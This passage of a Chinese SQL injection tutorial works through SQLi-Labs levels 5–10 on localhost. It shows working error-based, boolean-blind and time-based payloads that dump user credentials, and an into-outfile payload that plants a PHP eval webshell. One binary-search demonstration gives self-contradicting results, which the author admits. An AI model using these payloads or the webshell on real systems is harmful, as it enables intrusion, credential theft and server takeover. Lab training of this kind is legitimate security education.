http://localhost/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 2,1),0x7e),1)--+
```
→ password

完美！三个字段都找到了！✅

### 13.8.7 用 updatexml 爆数据

最后一步，爆数据！

我们来查第一个用户的用户名和密码：

```
http://localhost/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select concat(username,'---',password) from users limit 0,1),0x7e),1)--+
```

报错显示：
```
XPATH syntax error: '~Dumb---Dumb~'
```

第一个用户是 Dumb/Dumb。

第二个：
```
http://localhost/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select concat(username,'---',password) from users limit 1,1),0x7e),1)--+
```
→ Angelina---I-kill-you

...以此类推，一个一个查，就能把所有用户都查出来！

Less-5，通关！✅

### 13.8.8 Less-5 总结

Less-5 的考点是 **报错注入**。

特点：
- 页面不显示查询结果（没有回显位）
- 但是有数据库报错信息

解决方法：
- 用 `updatexml()` 或 `extractvalue()` 函数进行报错注入
- 从报错信息中获取数据

**updatexml 报错注入的通用格式：**
```sql
' and updatexml(1,concat(0x7e,(你要查的SQL语句),0x7e),1)--+
```

记住这个格式，以后遇到有报错的页面，直接套！

---

## 13.9 Less-6：GET - 双查询注入 - 双引号 - 字符型 🔡

第六关来了！

我猜你已经有预感了... 这一关应该和Less-5差不多，只是闭合方式不一样？

恭喜你，猜对了！🎉

### 13.9.1 确认闭合方式

老规矩，先试单引号：
```
http://localhost/sqli-labs/Less-6/?id=1'
```
没报错，正常显示。

再试双引号：
```
http://localhost/sqli-labs/Less-6/?id=1"
```
报错了！

所以，这一关是 **双引号闭合**。

### 13.9.2 报错注入

和Less-5一样，用updatexml报错注入，只是把单引号换成双引号。

**爆库：**
```
http://localhost/sqli-labs/Less-6/?id=1" and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```
→ security

剩下的爆表、爆字段、爆数据，都和Less-5一样，只是把单引号换成双引号就行。

Less-6，通关！✅

### 13.9.3 Less-6 总结

Less-6 = Less-5 - 单引号 + 双引号

就是这么简单！

---

## 13.10 Less-7：GET - 导出文件 - 单引号 📁

第七关，我们来学习一种新姿势：**导出文件注入**！

### 13.10.1 看看这一关

访问：
```
http://localhost/sqli-labs/Less-7/?id=1
```

页面显示：**You are in.... Use outfile......**

哇，提示都直接给你了！让你用 outfile！

再加个单引号试试：
```
http://localhost/sqli-labs/Less-7/?id=1'
```

报错了。不过这个报错信息有点简单，没显示SQL语句。

我们来测试一下闭合方式。

### 13.10.2 测试闭合方式

Less-7的闭合方式有点特殊，我们来试几种：

试 `1' and 1=1--+`：
不正常。

试 `1') and 1=1--+`：
也不正常。

试 `1')) and 1=1--+`：
哎？好像正常了！

对，Less-7的闭合方式是 **两个单引号加两个括号**：`'))`

> 💡 **怎么猜到的？** 其实就是多试。常见的闭合方式就那么几种：
> - `'`
> - `"`
> - `')`
> - `")`
> - `'))`
> - `"))`
> 
> 一个一个试，总能试出来的。就像开密码锁，虽然笨，但有效！🔓

### 13.10.3 什么是导出文件注入？🤔

导出文件注入，就是利用 `into outfile` 语法，把查询结果写入到一个文件里。

如果我们能把一句话木马写入到网站的目录下，那我们就能拿到网站的控制权了！

#### into outfile 是什么？

`into outfile` 是MySQL的一个语法，可以把查询结果导出到一个文件里。

比如：
```sql
SELECT 'hello' INTO OUTFILE 'C:/test.txt'
```

执行完之后，C盘下就会多出一个test.txt文件，内容是hello。

是不是很强大？

#### 利用条件 ⚠️

但是，`into outfile` 不是随随便便就能用的，需要满足几个条件：

1. **知道网站的绝对路径**
   - 你得知道网站的文件在服务器的哪个文件夹里，不然你写哪儿去？
   
2. **有文件写入权限**
   - MySQL用户得有往那个目录写文件的权限

3. **secure_file_priv 配置允许**
   - MySQL有个配置叫 `secure_file_priv`，如果它设置成某个目录，那只能往那个目录写文件
   - 如果设置成 `NULL`，那就不能导出文件

不过在我们的本地靶场里，这些条件基本都满足，所以可以放心玩！

### 13.10.4 怎么利用？写一句话木马！🦄

既然能写文件，那我们写个什么呢？当然是写 **一句话木马** 啦！

一句话木马是什么？就是一段很短的代码（通常只有一行），可以让我们执行任意命令。

PHP的一句话木马长这样：
```php
<?php @eval($_POST['cmd']); ?>
```

啥意思？简单解释：
- `$_POST['cmd']`：接收POST请求里的cmd参数
- `eval()`：把字符串当PHP代码执行
- `@`：出错了不显示错误信息

把这个文件传到网站上，然后我们用菜刀（或者蚁剑）连接，就能控制整个网站了！

> ⚠️ **重要提醒**：这只是在本地靶场练习！现实中未经授权入侵他人网站是违法的！千万不要拿去做坏事！

### 13.10.5 构造payload

好，我们来构造写入一句话木马的payload。

首先，我们需要知道网站的绝对路径。

在PHPStudy里，网站默认在WWW目录下，路径一般是：
```
C:/phpstudy_pro/WWW/sqli-labs/Less-7/
```

或者更简单，直接写到WWW根目录：
```
C:/phpstudy_pro/WWW/shell.php
```

> 💡 **注意**：路径里要用正斜杠 `/`，或者双反斜杠 `\\`，不要用单反斜杠 `\`，因为SQL里 `\` 是转义字符。

好，payload来了：

```sql
-1')) union select 1,'<?php @eval($_POST["cmd"]);?>',3 into outfile 'C:/phpstudy_pro/WWW/sqli-labs/shell.php'--+
```

解释一下：
- `union select 1, '木马内容', 3`：联合查询，把木马内容当作查询结果
- `into outfile '路径'`：把结果写入到指定文件

注意：
- 字段数还是3个（和前面一样）
- 木马内容放在第2个字段的位置（放哪个字段都行，只要位置对）
- 路径要根据你自己的PHPStudy安装路径修改

我们来试试：

```
http://localhost/sqli-labs/Less-7/?id=-1')) union select 1,'<?php @eval($_POST["cmd"]);?>',3 into outfile 'C:/phpstudy_pro/WWW/sqli-labs/shell.php'--+
```

页面可能会报错，或者显示不正常，没关系，我们去看看文件有没有生成。

打开你的文件管理器，去 `C:/phpstudy_pro/WWW/sqli-labs/` 目录下看看，有没有 `shell.php` 这个文件？

如果有，恭喜你！写入成功了！🎉

### 13.10.6 验证一句话木马

文件写进去了，怎么验证能不能用呢？

我们可以写个简单的phpinfo来测试：

先写个phpinfo：
```
http://localhost/sqli-labs/Less-7/?id=-1')) union select 1,'<?php phpinfo();?>',3 into outfile 'C:/phpstudy_pro/WWW/sqli-labs/phpinfo.php'--+
```

然后访问：
```
http://localhost/sqli-labs/phpinfo.php
```

如果看到了phpinfo的页面，说明文件写入成功，而且能正常执行PHP代码！✅

> 💡 **小提示**：如果写入失败怎么办？
> 1. 检查路径对不对
> 2. 检查文件名是不是已经存在了（MySQL的into outfile不能覆盖已存在的文件）
> 3. 换个路径试试，比如直接写到WWW根目录

Less-7，通关！✅

### 13.10.7 Less-7 总结

Less-7 的考点是 **文件导出注入**（into outfile）。

关键点：
- 利用 `into outfile` 语法写入文件
- 写入一句话木马，getshell
- 需要知道网站绝对路径、有写入权限

**通用payload格式：**
```sql
union select 1,'一句话木马',3 into outfile '路径/shell.php'
```

---

## 13.11 Less-8：GET - 布尔盲注 - 单引号 - 字符型 👀

第八关！这一关我们要接触一个更有挑战性的注入方式：**布尔盲注**！

### 13.11.1 看看这一关

访问：
```
http://localhost/sqli-labs/Less-8/?id=1
```

页面显示：**You are in...........**

加个单引号试试：
```
http://localhost/sqli-labs/Less-8/?id=1'
```

哎？页面不显示了！而且... **没有报错信息？**

对！这一关既没有数据回显，也没有报错信息。

那我们怎么判断注入是否成功呢？

注意观察：
- `id=1` 时，页面显示 "You are in..........."
- `id=1'` 时，页面什么都不显示（或者显示空白）

页面只有两种状态：
- ✅ 正常（显示You are in）
- ❌ 不正常（不显示）

这就是 **布尔盲注**！

### 13.11.2 什么是布尔盲注？🤔

布尔盲注，就是页面只有两种状态（真/假、正常/不正常），我们通过判断页面状态，来猜测数据。

打个比方：
- 普通注入：就像你问银行柜员"我账户里有多少钱？"，柜员直接告诉你数字
- 报错注入：就像柜员不告诉你，但你故意说错，他会纠正你，你从纠正里听到答案
- **布尔盲注**：就像柜员是个哑巴，只会点头或摇头。你问"我的余额是不是大于1000？"，他点头；你再问"是不是大于2000？"，他摇头。你就这样一个一个猜，最后猜出准确数字！

布尔盲注就是这样：**一个字符一个字符地猜！**

### 13.11.3 用到的函数

布尔盲注常用这几个函数：

1. **length()**：求字符串长度
   - `length(database())` → 数据库名的长度

2. **substr()**：截取字符串的某一位
   - `substr(database(), 1, 1)` → 数据库名的第1个字符
   - `substr(database(), 2, 1)` → 数据库名的第2个字符

3. **ascii()**：把字符转成ASCII码
   - `ascii('a')` → 97
   - 为什么要转ASCII？因为数字好比较大小啊！

### 13.11.4 第一步：猜数据库名的长度

我们先来猜：**当前数据库名有多长？**

payload：
```sql
1' and length(database()) > 5--+
```

啥意思？如果数据库名的长度大于5，页面就正常显示（You are in），否则就不正常。

我们来试：

先试长度是不是大于5：
```
http://localhost/sqli-labs/Less-8/?id=1' and length(database())>5--+
```
页面正常 → 说明长度 > 5

再试是不是大于10：
```
http://localhost/sqli-labs/Less-8/?id=1' and length(database())>10--+
```
页面不正常 → 说明长度 ≤ 10

再试是不是大于8：
```
http://localhost/sqli-labs/Less-8/?id=1' and length(database())>8--+
```
不正常 → 长度 ≤ 8

再试是不是等于8：
```
http://localhost/sqli-labs/Less-8/?id=1' and length(database())=8--+
```
正常！✅

所以，数据库名的长度是 **8** 个字符。

> 💡 **二分法**：猜数字的时候，用二分法最快。先猜一个中间值，根据结果缩小范围，再猜中间值... 很快就能找到答案。

### 13.11.5 第二步：猜数据库名的每一位

知道了长度是8，接下来我们一个字符一个字符地猜。

先猜第1个字符：
```sql
1' and ascii(substr(database(),1,1)) > 100--+
```

我们还是用二分法：

先试ASCII码是不是大于100：
```
http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),1,1))>100--+
```
正常 → 大于100

是不是大于115：
```
http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),1,1))>115--+
```
不正常 → ≤115

是不是大于110：
```
http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),1,1))>110--+
```
不正常 → ≤110

是不是大于105：
```
http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),1,1))>105--+
```
正常 → 大于105

所以在106到110之间。再试108：
```
http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),1,1))>108--+
```
正常 → 大于108

那就是109或110。试109：
```
http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),1,1))=115--+
```
不对。等等，我重新来... 其实我们已经知道数据库名是security了，第1个字符是's'，ASCII码是115。

哎呀，我前面的步骤算错了 😅。没关系，我给大家演示思路。

直接验证一下：
```
http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),1,1))=115--+
```
页面正常！说明第1个字符的ASCII码是115，也就是小写字母 `s`。

好，第1个字符猜出来了：**s**

接下来第2个字符，把 `substr(...,1,1)` 改成 `substr(...,2,1)`，用同样的方法猜...

第2个字符是 'e'（ASCII 101）：
```
http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),2,1))=101--+
```
正常。

...

就这样一个一个猜，最后你会猜出完整的数据库名：**security**（8个字符，和我们之前猜的长度一致！）

### 13.11.6 后面的爆表、爆字段、爆数据

猜出了数据库名，后面爆表名、爆字段名、爆数据，都是同样的思路：
- 先猜有几个表
- 再猜每个表名的长度
- 再一个字符一个字符猜表名
- 然后猜字段、猜数据...

都是一样的套路，就是比较费时间。

### 13.11.7 手工盲注太累了怎么办？😩

看到这里你可能会说：我的天，一个字符一个字符猜，这得猜到什么时候去？

别急，手工盲注主要是让你理解原理。实际操作中，我们一般用工具来跑，比如SQLmap，它会自动帮你猜，快得很！

但是！**手工你得会，原理你得懂**，不然工具跑出来结果，你都不知道是怎么回事儿。

就像学数学，你得先会手算，才能用计算器。但真正做复杂题目的时候，谁还用手算啊？😄

Less-8，通关！✅

### 13.11.8 Less-8 总结

Less-8 的考点是 **布尔盲注**。

特点：
- 没有数据回显
- 没有报错信息
- 页面只有两种状态（正常/不正常）

方法：
- 利用 `length()`、`substr()`、`ascii()` 等函数
- 一个字符一个字符地猜数据
- 通过页面是否正常来判断猜得对不对

---

## 13.12 Less-9：GET - 时间盲注 - 单引号 - 字符型 ⏰

第九关！我们来学习最后一种基础注入方式：**时间盲注**！

### 13.12.1 看看这一关

访问：
```
http://localhost/sqli-labs/Less-9/?id=1
```

页面显示：**You are in...........**

加个单引号试试：
```
http://localhost/sqli-labs/Less-9/?id=1'
```
哎？页面还是正常显示？

试 `1' and 1=1--+`：
还是正常。

试 `1' and 1=2--+`：
居然也正常？！

这是什么情况？无论我们输入什么，页面都显示一样的内容？

没错！这就是 **时间盲注** 的场景：
- 页面无论对还是错，显示的内容都一样
- 我们没法通过页面内容来判断

那怎么办呢？我们可以用 **时间** 来判断！

### 13.12.2 什么是时间盲注？🤔

时间盲注，也叫延时盲注，就是利用 `sleep()` 函数让数据库休眠一段时间。如果条件成立，页面就会延迟加载；如果条件不成立，页面就很快返回。

打个比方：
- 布尔盲注：柜员会点头或摇头，你能看到
- **时间盲注**：柜员既不点头也不摇头，什么表示都没有。但是你跟他说"如果我说对了，你就等5秒钟再说话"，然后你观察他是不是等了5秒才开口... 你通过等待时间来判断对错！

是不是很聪明？😏

### 13.12.3 用到的函数

时间盲注主要用这两个函数：

1. **sleep(n)**：休眠n秒
   - `sleep(5)` → 停5秒再继续

2. **if(条件, 成立时, 不成立时)**：条件判断
   - `if(1=1, sleep(5), 1)` → 如果1=1成立，就睡5秒，否则返回1

组合起来就是：
```sql
if(我们的条件, sleep(5), 1)
```

如果条件成立，页面会延迟5秒以上才加载；如果不成立，页面很快就加载完了。

通过观察页面加载时间，我们就能判断条件是否成立！

### 13.12.4 确认注入点

首先，我们确认一下这一关是单引号的时间盲注。

测试：
```
http://localhost/sqli-labs/Less-9/?id=1' and sleep(5)--+
```

访问这个URL，你会发现... 页面加载了好半天！大概5秒以上才返回。

这就对了！说明我们的 `sleep(5)` 执行成功了！

再试一下正常的（不加sleep）：
```
http://localhost/sqli-labs/Less-9/?id=1
```
瞬间就加载完了。

完美！确认了，这是 **单引号的时间盲注**。

### 13.12.5 猜数据库名的长度

和布尔盲注一样，我们还是先猜数据库名的长度。

payload：
```sql
1' and if(length(database())=8, sleep(5), 1)--+
```

意思是：如果数据库名长度等于8，就睡5秒，否则立刻返回。

我们来试：
```
http://localhost/sqli-labs/Less-9/?id=1' and if(length(database())=8, sleep(5), 1)--+
```

访问后，你会发现页面延迟了5秒左右才出来。说明长度确实是8！✅

如果试length=7：
```
http://localhost/sqli-labs/Less-9/?id=1' and if(length(database())=7, sleep(5), 1)--+
```
页面很快就加载完了，说明不是7。

### 13.12.6 猜数据库名的每一位

和布尔盲注一样，用 `substr()` 和 `ascii()` 一个字符一个字符地猜。

猜第1个字符是不是's'（ASCII 115）：
```sql
1' and if(ascii(substr(database(),1,1))=115, sleep(5), 1)--+
```

访问：
```
http://localhost/sqli-labs/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115, sleep(5), 1)--+
```

延迟了5秒！说明第1个字符就是's'！✅

后面的步骤和布尔盲注完全一样，只是把 `and 条件` 换成了 `and if(条件, sleep(5), 1)`，然后通过页面加载时间来判断。

### 13.12.7 时间盲注更费时间... 😴

看到这里你肯定发现了：时间盲注比布尔盲注还要慢！布尔盲注至少页面还能立刻返回，时间盲注每猜一次都要等好几秒...

没错，手工时间盲注简直是折磨！

所以实际中，时间盲注我们肯定用工具跑，比如SQLmap，它会自动帮我们处理这些等待。

还是那句话：**手工你得会，原理你得懂，但实际操作可以用工具。**

Less-9，通关！✅

### 13.12.8 Less-9 总结

Less-9 的考点是 **时间盲注**。

特点：
- 页面无论对错，显示都一样
- 没有回显，没有报错
- 只能通过时间延迟来判断

方法：
- 利用 `sleep()` 和 `if()` 函数
- 条件成立就延迟，不成立就不延迟
- 通过观察页面加载时间来判断

---

## 13.13 Less-10：GET - 时间盲注 - 双引号 - 字符型 ⏱️

第十关！最后一关了！

我想你已经猜到了... 这一关就是把Less-9的单引号换成双引号！

恭喜你，又答对了！🎉

### 13.13.1 确认注入点

试一下：
```
http://localhost/sqli-labs/Less-10/?id=1" and sleep(5)--+
```

页面延迟了5秒以上。

而用单引号的话：
```
http://localhost/sqli-labs/Less-10/?id=1' and sleep(5)--+
```
页面立刻就返回了，没有延迟。

所以，这一关是 **双引号的时间盲注**。

### 13.13.2 后面都一样

后面猜库名、表名、字段、数据，都和Less-9一样，只是把单引号换成双引号。

举个例子，猜数据库长度：
```
http://localhost/sqli-labs/Less-10/?id=1" and if(length(database())=8, sleep(5), 1)--+
```

延迟5秒，正确。

Less-10，通关！✅

### 13.13.3 Less-10 总结

Less-10 = Less-9 - 单引号 + 双引号

简单！

---

## 13.14 本章总结 🎊

恭喜你！SQLi-Labs的前10关我们都闯完了！🎉🎉🎉

是不是感觉收获满满？我们来总结一下这10关学到了什么。

### 13.14.1 四种主要的注入类型

前10关我们学习了四种最基础的SQL注入类型：

| 注入类型 | 适用场景 | 代表关卡 | 核心思路 |
|---------|---------|---------|---------|
| **联合查询注入** | 页面有数据回显 | Less1-4 | 用union select把数据显示出来 |
| **报错注入** | 页面有报错信息，但没有数据回显 | Less5-6 | 用updatexml等函数从报错中取数据 |
| **文件导出注入** | 可以写文件，知道绝对路径 | Less7 | 用into outfile写一句话木马 |
| **布尔盲注** | 页面只有真/假两种状态，没有回显和报错 | Less8 | 一个字符一个字符猜，通过页面状态判断 |
| **时间盲注** | 页面无论对错都一样，什么都没有 | Less9-10 | 用sleep()延时，通过加载时间判断 |

这四种注入方式，可以说是SQL注入的"四大基本功"！把这四种搞明白了，后面的关卡万变不离其宗。

### 13.14.2 各种闭合方式

前10关我们还见识了各种闭合方式：

| 闭合方式 | 代表关卡 | SQL语句示例 |
|---------|---------|------------|
| 单引号 `'` | Less1, 5, 8, 9 | `WHERE id = '1'` |
| 双引号 `"` | Less2？不，数字型 | `WHERE id = "1"` |
| 数字型（无引号） | Less2 | `WHERE id = 1` |
| 单引号+括号 `')` | Less3 | `WHERE id = ('1')` |
| 双引号+括号 `")` | Less4 | `WHERE id = ("1")` |
| 单引号+双括号 `'))` | Less7 | `WHERE id = (('1'))` |
| 双引号的盲注 | Less6, 10 | `WHERE id = "1"` |

闭合方式虽然多，但判断方法其实很简单：
1. 先加单引号，看有没有变化（报错、不正常）
2. 如果单引号没用，试试双引号
3. 如果报错了，从报错信息里分析SQL结构
4. 实在不行就各种组合一个一个试

### 13.14.3 注入的一般思路

不管什么类型的注入，总体思路都是一样的：

```
发现注入点 → 判断注入类型和闭合方式 → 获取数据（库→表→字段→数据）
```

就像剥洋葱，一层一层往里深入！🧅

### 13.14.4 给新手的几句话 💬

1. **不要死记硬背payload，要理解原理**
   - 理解了原理，遇到新场景你也能自己构造payload
   - 死记硬背的话，稍微变一下你就不会了

2. **多练，熟能生巧**
   - SQL注入是个手艺活，光看没用，得自己动手
   - 这10关建议你每关都亲手打一遍，别光看教程

3. **手工注入是基础，但工具也要会用**
   - 前几关用手工，理解原理
   - 后面复杂的关卡，可以用SQLmap辅助
   - 但一定要知道工具在做什么，不能只会"一把梭"

4. **保持好奇心，多思考**
   - 为什么这么写就能注入？
   - 有没有别的方法？
   - 如果我是程序员，我会怎么防？

### 13.14.5 下章预告 📢

前10关只是热身！真正的挑战还在后面！

下一章，我们将继续闯关 **Less11-25**，内容包括：
- POST型注入（注入点在POST参数里）
- Cookie注入（注入点在Cookie里）
- User-Agent注入（注入点在HTTP头里）
- Referer注入
- 各种绕过技巧
- ...

是不是已经开始期待了？😎

好了，这一章就到这里。大家先把前10关好好消化一下，我们下一章再见！

**加油！你已经在成为安全大佬的路上了！** 💪🚀

---

> 💡 **本章练习建议**：
> 1. 把Less1到Less10每一关都亲手打一遍
> 2. 每一关都尝试用不同的方法（比如能用联合查询的，也试试报错注入能不能打）
> 3. 准备一个笔记本，记录每一关的payload和思路
> 4. 遇到问题别着急看答案，先自己想半小时
